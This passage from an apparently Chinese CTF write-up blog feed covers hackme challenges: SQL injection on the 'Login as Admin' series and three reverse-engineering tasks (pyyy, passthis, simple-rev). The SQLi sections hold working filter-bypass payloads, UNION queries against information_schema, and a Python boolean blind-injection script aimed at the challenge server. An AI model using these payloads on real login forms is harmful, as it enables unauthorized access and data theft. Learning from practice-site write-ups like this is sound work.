class="comment">//将单引号替换为\\'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的关键就是绕过这些过滤。strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p><p>一般情况我们可以通过输入<br>admin’ or 1=1# 来进行注入(密码部分任意填写，因为#注释掉后面的查询条件)，因为sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>此时如果没有过滤，查询变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#' AND `password` = '%s'</span></span><br></pre></td></tr></table></figure><p>可以注入，但是现在过滤后，“or 1=1”不能使用，这个可以通过“||”绕过（其实也可以用2=2绕过），所以改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' || 1=1#</span></span><br></pre></td></tr></table></figure><p>其中的’被取代为“\\&#39;”，所以查询变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin\' || 1=1#'</span> <span class="keyword">AND</span> `password` = <span class="string">'%s'</span></span><br></pre></td></tr></table></figure><p>语法错误，“’”没有被闭合。可以通过在admin后再加一个\进行转义，将\\‘中的第一个\转义,即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\<span class="string">' || 1=1#。</span></span><br></pre></td></tr></table></figure><p>则查询语句变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin\\'</span> || <span class="number">1</span>=<span class="number">1</span><span class="comment">#' AND `password` = '%s'</span></span><br></pre></td></tr></table></figure><p>可以进行注入，结果如图：</p><p><img src="./loginasadmin0.PNG" alt="login0"></p><p>说明登录的不是管理员账号，从源代码的注释可以看到一下信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br></pre></td></tr></table></figure><p>所以表中有一列为is_admin确定了是否为管理员，我们拿到的数据库的第一行返回的用户并不是管理员，所以我们需要查看返回的其他行，通过limit 1,1来限制。我们去第2个输出。</p><p>注入语句变为：admin\‘ || 1=1 limit 1,1#。再进行注入得到flag：<br><img src="./loginasadmin1.PNG" alt="login0"></p><h3 id="Login-as-Admin-0-1"><a href="#Login-as-Admin-0-1" class="headerlink" title="Login as Admin 0.1"></a>Login as Admin 0.1</h3><p>同时提示flag2在数据库中，所以需要通过SQLi来获取数据库里面隐藏的其他flag。其实第一个flag的值已经提示了需要使用UNION查询：</p><p>我们先来测试页面显示的是查询结果的第几列：<br>注入语句为：admin\‘ union select 1,2,3,4#<br>返回页面如下：<br><img src="./loginasadmin2.PNG" alt="login0"><br>2被回显，说明回显的是第2列，我们就利用2的位置显示我们需要的数据，我们演示全部过程：</p><ol><li>查数据库名字：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,database(),3,4#</span></span><br></pre></td></tr></table></figure><p>得到数据库名字为：login_as_admin0<br>2. 查询表名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA="login_as_admin0"),3,4#</span></span><br></pre></td></tr></table></figure><p>得到有两个表：h1dden_f14g,user<br>可以看出隐藏的flag应该在h1dden_f14g表中。<br>3. 查询表的列名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME="h1dden_f14g"),3,4#</span></span><br></pre></td></tr></table></figure><p>得到就只有1列：<br>the_f14g<br>4. 查询该列的具体内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select the_f14g from login_as_admin0.h1dden_f14g),3,4#</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="./loginasadmin3.PNG" alt="login0"></p><h3 id="Login-as-Admin-1"><a href="#Login-as-Admin-1" class="headerlink" title="Login as Admin 1"></a>Login as Admin 1</h3><p>查看源代码，发现过滤部分。关键处为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空格，我们可以用/**/来代替空格进行绕过，其他和前面一样，payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\<span class="string">'/**/or/**/2=2/**/limit/**/1,1#</span></span><br></pre></td></tr></table></figure><p>得到flag：<br><img src="./admin1.PNG" alt="login1"></p><h3 id="Login-as-Admin-1-2"><a href="#Login-as-Admin-1-2" class="headerlink" title="Login as Admin 1.2"></a>Login as Admin 1.2</h3><p>同样的绕过方式，但是这一题无回显了，采取bool盲注，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"https://hackme.inndy.tw/login1/index.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">def exp(i, j):</span><br><span class="line">    <span class="comment"># payload = f"admin\\'/**/or/**/ascii(substr((SELECT/**/binary/**/group_concat(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()),&#123;i&#125;,1))&gt;&#123;j&#125;/**/limit/**/1,1#"</span></span><br><span class="line">    <span class="comment"># 0bdb54c98123f5526ccaed982d2006a9,users   </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload = f"admin\\'/**/or/**/ascii(substr((SELECT/**/binary/**/group_concat(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;i&#125;,1))&gt;&#123;j&#125;/**/limit/**/1,1#"</span></span><br><span class="line">    <span class="comment"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class="line"></span><br><span class="line">    payload = f<span class="string">"admin\\'/**/or/**/ascii(substr((SELECT/**/binary/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/FROM/**/0bdb54c98123f5526ccaed982d2006a9),&#123;i&#125;,1))&gt;&#123;j&#125;/**/limit/**/1,1#"</span></span><br><span class="line">    <span class="comment"># FLAG&#123;W0W, You found the correct table and the flag, and UserAgent&#125;</span></span><br><span class="line">    data = &#123;<span class="string">"name"</span>: payload, <span class="string">"password"</span>: <span class="string">"bitsec"</span>&#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"You are admin!"</span> in r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high) <span class="comment">// 2</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += chr((low + high + <span class="number">1</span>) <span class="comment">// 2)</span></span><br><span class="line">    <span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>典型的SQLi注入流程，堪称教学式SQLi。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-loginasadmin-系列&quot;&gt;&lt;a href=&quot;#src-hackme-loginasadmin-系列&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] loginasadmin 系列&quot;&gt;&lt;/a&gt;[src = hackme] loginasadmin 系列&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;login as admin 0： SQL Injection!&lt;br&gt;login as admin 0.1：  Grab the hidden flag&lt;br&gt;Login as Admin 1：Please login as admin.&lt;br&gt;    Tips: SQL Injection but sqlmap not working anymore.&lt;br&gt;    Update: Source code is available now.&lt;br&gt;    Scanner WON’T WORK&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="SQLi" scheme="http://yoursite.com/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>pyyy</title>
    <link href="http://yoursite.com/2019/10/11/pyyy/"/>
    <id>http://yoursite.com/2019/10/11/pyyy/</id>
    <published>2019-10-11T10:59:48.000Z</published>
    <updated>2019-10-11T11:09:57.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-pyyy"><a href="#src-hackme-pyyy" class="headerlink" title="[src = hackme] pyyy"></a>[src = hackme] pyyy</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you pass the challenage?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>下载题目文件为一个pyc文件（python字节码文件，有python虚拟机解释执行），因此首先需要反编译，这里我们使用uncompyle6来反编译。</p><p>如果没有安装，可以使用下面的命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uncompyle6</span><br></pre></td></tr></table></figure><p>安装成功后使用该工具反编译题目给定的pyc文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 pyyy.pyc &gt; pyyy.py</span><br></pre></td></tr></table></figure><p>反编译后的结果保存为python源代码文件pyyy.py。打开阅读发现有有大片数据，关键代码在一个用户输入的位置，源代码对l和c进行比较，如果输入的c与l不相等，就退出了，再读代码发现程序的结果实际跟输入没有关系，所以直接注释掉输入和判断语句执行，就得到flag。注释部分(代码中带#部分)如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, f <span class="keyword">in</span> enumerate(F):</span><br><span class="line">    n = pow(f, m, g)</span><br><span class="line">    this_is = <span class="string">'Y-Combinator'</span></span><br><span class="line">    l = (<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span> *args: y(y)(*args))))(<span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &lt; <span class="number">2</span> <span class="keyword">else</span> f(x - <span class="number">1</span>) * x % n)(g % <span class="number">27777</span>)</span><br><span class="line">    <span class="comment"># c = raw_input('Channenge #%d:' % i)</span></span><br><span class="line">    <span class="comment"># if int(c) != l:</span></span><br><span class="line">    <span class="comment">#     print 'Wrong~'</span></span><br><span class="line">    <span class="comment">#     exit()</span></span><br><span class="line">    z.append(l)</span><br></pre></td></tr></table></figure><p>然后运行得flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/pyyy$ python pyyy.py</span><br><span class="line">flag is FLAG&#123;VBXDVV4jkVVS4hVVj7NVV1heVVX1jVVh&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-pyyy&quot;&gt;&lt;a href=&quot;#src-hackme-pyyy&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] pyyy&quot;&gt;&lt;/a&gt;[src = hackme] pyyy&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Can you pass the challenage?&lt;/p&gt;
    
    </summary>
    
    
      <category term="RE" scheme="http://yoursite.com/categories/RE/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="RE" scheme="http://yoursite.com/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>passthis</title>
    <link href="http://yoursite.com/2019/10/11/passthis/"/>
    <id>http://yoursite.com/2019/10/11/passthis/</id>
    <published>2019-10-11T07:03:19.000Z</published>
    <updated>2019-10-11T07:17:26.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-passthis"><a href="#src-hackme-passthis" class="headerlink" title="[src = hackme] passthis"></a>[src = hackme] passthis</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>You should be able to pass this</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>直接IDA–&gt;F5，得到一大段代码，仔细查看，有用的就是下面部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Let me check your flag: "</span>, v9);</span><br><span class="line">fgets(v10, <span class="number">1023</span>, (FILE *)iob[<span class="number">0</span>]._ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v10[<span class="number">0</span>] &gt; <span class="number">0xD</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v10[<span class="number">0</span>] == <span class="string">'F'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">9217</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (<span class="keyword">unsigned</span> __int8)v10[++v4];</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v6 &lt;= <span class="number">0xD</span>u )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( _bittest(&amp;v5, v6) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( ((<span class="keyword">unsigned</span> __int8)byte_404040[v4] ^ (<span class="keyword">unsigned</span> __int8)v6) == <span class="number">0x87</span>u );</span><br><span class="line">    &#125;</span><br><span class="line">......（省略）</span><br><span class="line">LABEL_9:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good flag ;)"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>其中v10这个数组就是flag，首先判断其首字母是不是‘F’，如果是的话进入循环，我们看到，需要输入的flag满足while的条件，然后才有机会挑战到LABEL_9，(即 goto LABEL_9;)  。所以关键是while里面的循环做了什么操作。其实可以看出，while的条件就是将byte_404040数组里面的每个字节跟flag数组V10的每个字节（在循环中被赋值给v6）进行XOR操作要求结果是0x87u。</p><p>所以根据XOR的性质，v6=byte_404040[v4]^0x87u即可，所以从程序的hex-view中把byte_404040数组的内容取出来，然后使用python写下面脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0xC1</span>,<span class="number">0xCB</span>,<span class="number">0xC6</span>,<span class="number">0xC0</span>,<span class="number">0xFC</span>,<span class="number">0xC9</span>,<span class="number">0xE8</span>,<span class="number">0xAB</span>,<span class="number">0xA7</span>,<span class="number">0xDE</span>,<span class="number">0xE8</span>,<span class="number">0xF2</span>,<span class="number">0xA7</span>,<span class="number">0xF4</span>,<span class="number">0xEF</span>,<span class="number">0xE8</span>,<span class="number">0xF2</span>,<span class="number">0xEB</span>,<span class="number">0xE3</span>,<span class="number">0xA7</span>,<span class="number">0xE9</span>,<span class="number">0xE8</span>,<span class="number">0xF3</span>,<span class="number">0xA7</span>,<span class="number">0xF7</span>,<span class="number">0xE6</span>,<span class="number">0xF4</span>,<span class="number">0xF4</span>,<span class="number">0xA7</span>,<span class="number">0xF3</span>,<span class="number">0xEF</span>,<span class="number">0xE2</span>,<span class="number">0xA7</span>,<span class="number">0xE1</span>,<span class="number">0xEB</span>,<span class="number">0xE6</span>,<span class="number">0xE0</span>,<span class="number">0xFA</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=chr(i^<span class="number">0x87</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>运行输出flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-passthis&quot;&gt;&lt;a href=&quot;#src-hackme-passthis&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] passthis&quot;&gt;&lt;/a&gt;[src = hackme] passthis&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;You should be able to pass this&lt;/p&gt;
    
    </summary>
    
    
      <category term="RE" scheme="http://yoursite.com/categories/RE/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="IDA" scheme="http://yoursite.com/tags/IDA/"/>
    
      <category term="RE" scheme="http://yoursite.com/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>simple-rev</title>
    <link href="http://yoursite.com/2019/10/11/simple-rev/"/>
    <id>http://yoursite.com/2019/10/11/simple-rev/</id>
    <published>2019-10-11T02:26:47.000Z</published>
    <updated>2019-10-11T02:31:32.629Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-simple-rev"><a href="#src-hackme-simple-rev" class="headerlink" title="[src = hackme] simple-rev"></a>[src = hackme] simple-rev</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>A little bit harder</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>直接IDA–&gt;F5，得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> checking[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>]; <span class="comment">// [esp+4Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What is flag? "</span>);</span><br><span class="line">  fgets(buffer, <span class="number">63</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; buffer[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buffer[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      buffer[i] = <span class="number">0</span>;</span><br><span class="line">      checking[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      checking[i] = buffer[i] + <span class="number">1</span>;  <span class="comment">//简单的移位，只需要反向移位即可得到flag</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(checking, <span class="string">"UIJT.JT.ZPVS.GMBH"</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"FLAG&#123;%s&#125;\n"</span>, buffer);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try hard."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用python解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"UIJT.JT.ZPVS.GMBH"</span></span><br><span class="line">r = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    r += chr(ord(i) - <span class="number">1</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><p>输出flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-simple-rev&quot;&gt;&lt;a href=&quot;#src-hackme-simple-rev&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] simple-rev&quot;&gt;&lt;/a&gt;[src = hackme] simple-rev&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;A little bit harder&lt;/p&gt;
    
    </summary>
    
    
      <category term="RE" scheme="http://yoursite.com/categories/RE/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="IDA" scheme="http://yoursite.com/tags/IDA/"/>
    
      <category term="RE" scheme="http://yoursite.com/tags/RE/"/>
    
  </entry>
  
</feed>
